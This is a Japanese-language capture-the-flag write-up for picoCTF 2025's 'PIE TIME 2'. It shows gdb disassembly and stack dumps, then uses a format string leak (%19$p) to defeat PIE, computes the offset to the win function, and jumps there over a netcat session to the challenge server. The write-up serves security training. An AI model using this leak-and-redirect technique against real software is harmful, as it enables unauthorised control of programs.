# PicoCTF2025　PIE TIME2

バイナリとソースコードが提供され、nc経由でバイナリを実行し、フラグを取得する。

vunlの中にあるwin関数とmain関数の間の距離を調べる
printfの脆弱性Format String Bugで解く（%pでポインタを表示させて現在のアドレスを知り、そこから逆算してそのprintfとmainの距離を調べる）

gdbを使用、gdb ./vuln

call_functionの中のprintf18行目（printf(" enter the address to jump to, ex => 0x12345: ");）の部分をブレークポイントを置いて実行する、そのあとを動かすと保存されたスタックの内容が変わってしまうため

(gdb) disas mainでmain関数を逆アセンブルすると次のようになる

例
```
(gdb) disas main
Dump of assembler code for function main:
   0x0000555555555400 <+0>:     endbr64
   0x0000555555555404 <+4>:     push   %rbp
   0x0000555555555405 <+5>:     mov    %rsp,%rbp
   0x0000555555555408 <+8>:     lea    -0x166(%rip),%rsi        # 0x5555555552a9 <segfault_handler>
   0x000055555555540f <+15>:    mov    $0xb,%edi
   0x0000555555555414 <+20>:    call   0x555555555170 <signal@plt>
   0x0000555555555419 <+25>:    mov    0x2bf0(%rip),%rax        # 0x555555558010 <stdout@@GLIBC_2.2.5>
   0x0000555555555420 <+32>:    mov    $0x0,%ecx
   0x0000555555555425 <+37>:    mov    $0x2,%edx
   0x000055555555542a <+42>:    mov    $0x0,%esi
   0x000055555555542f <+47>:    mov    %rax,%rdi
   0x0000555555555432 <+50>:    call   0x555555555180 <setvbuf@plt>
   0x0000555555555437 <+55>:    mov    $0x0,%eax
   0x000055555555543c <+60>:    call   0x5555555552c7 <call_functions>
   0x0000555555555441 <+65>:    mov    $0x0,%eax
   0x0000555555555446 <+70>:    pop    %rbp
   0x0000555555555447 <+71>:    ret
End of assembler dump.
```

0x0000555555555441 <+65>:    mov    $0x0,%eaxが
movが関数呼び出しでありmainの一番最後にcall_functionが呼び出されているので、call_functionであることがわかる。

次にrで実行する。ブレークポイントで中断されるのでその状態で$rspでスタックの中身を見る

例

```
(gdb) x/40gx $rsp
0x7fffffffdc20: 0x00007fffffffdc40      0x00007ffff7e38415
0x7fffffffdc30: 0x0000000000000a61      0x00007ffff7faa5c0
0x7fffffffdc40: 0x00007fffffffdc80      0x00007ffff7e2e67f
0x7fffffffdc50: 0x0000000000000000      0x00007fffffffddb8
0x7fffffffdc60: 0x0000000000000001      0x0000000000000000
0x7fffffffdc70: 0x0000000000000000      0x8cc5d5e30889d800
0x7fffffffdc80: 0x00007fffffffdc90      0x0000555555555441
0x7fffffffdc90: 0x00007fffffffdd30      0x00007ffff7dd01ca
0x7fffffffdca0: 0x00007fffffffdce0      0x00007fffffffddb8
0x7fffffffdcb0: 0x0000000155554040      0x0000555555555400
0x7fffffffdcc0: 0x00007fffffffddb8      0x586b5c674feff613
0x7fffffffdcd0: 0x0000000000000001      0x0000000000000000
0x7fffffffdce0: 0x0000000000000000      0x00007ffff7ffd000
0x7fffffffdcf0: 0x586b5c674ccff613      0x586b4c22f68df613
0x7fffffffdd00: 0x00007fff00000000      0x0000000000000000
0x7fffffffdd10: 0x0000000000000000      0x0000000000000001
0x7fffffffdd20: 0x0000000000000000      0x8cc5d5e30889d800
0x7fffffffdd30: 0x00007fffffffdd90      0x00007ffff7dd028b
0x7fffffffdd40: 0x00007fffffffddc8      0x00007ffff7ffe2e0
0x7fffffffdd50: 0x00007fff00000000      0x0000555555555400
```
これの14番目にcall_functionsの関数呼び出しのアドレスがあることがわかる。

printfの仕様として、（この環境では）printfの引数は6個までレジスタから取られ、残りはスタックから取られるから14+6-1（1は重複分）である19番目にmain関数があることがわかる
よって、mainからwinまでの間を引いた分を今のmain関数から引けば、winの関数のメモリの位置がわかる。
```
(gdb) p *win
$1 = {<text variable, no debug info>} 0x55555555536a <win>
(gdb) p 0x0000555555555441-0x55555555536a
$2 = 215
```
あとはこの情報をもとにnc接続したサーバーでwin関数へジャンプさせればよい

```
$ nc rescued-float.picoctf.net 59084
Enter your name:%19$p
0x606c4bf9e441 # <- call_functionsの戻りアドレス
 enter the address to jump to, ex => 0x12345: 0x606c4bf9e36a # <- 0x606c4bf9e441 - 215
You won!
```

参考
https://zenn.dev/tetsurou/articles/6fe4d41a3f6f48#pie-time-2---200pt

https://everykalax.hateblo.jp/entry/2025/03/18/084018#PIE-TIME-2-binary-200